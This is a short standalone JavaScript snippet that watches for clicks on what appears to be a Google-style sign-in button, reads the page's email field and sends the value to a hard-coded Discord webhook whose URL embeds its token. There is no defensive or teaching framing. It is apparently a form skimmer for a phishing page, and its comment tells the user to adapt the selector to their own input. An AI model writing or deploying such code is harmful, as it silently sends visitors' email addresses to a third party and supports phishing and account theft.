const webhookURL = "https://discord.com/api/webhooks/1499170725993648320/qVHN6jlZ0E_fUgeyj1JyTX7TbhjS3tzDiBmHLziI_8DrUKhRhqeGuAvidBXGKqWQgzn5";

// listen for clicks on that element
document.addEventListener("click", function (e) {
    const target = e.target.closest(".VfPpkd-RLmnJb");
    if (!target) return;

    // adjust selector to match your actual email input
    const emailInput = document.querySelector('input[type="email"]');
    if (!emailInput) return;

    const email = emailInput.value;

    if (!email || !email.includes("@")) return;

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: `New email submitted: ${email}`
        })
    }).catch(err => console.error(err));
});
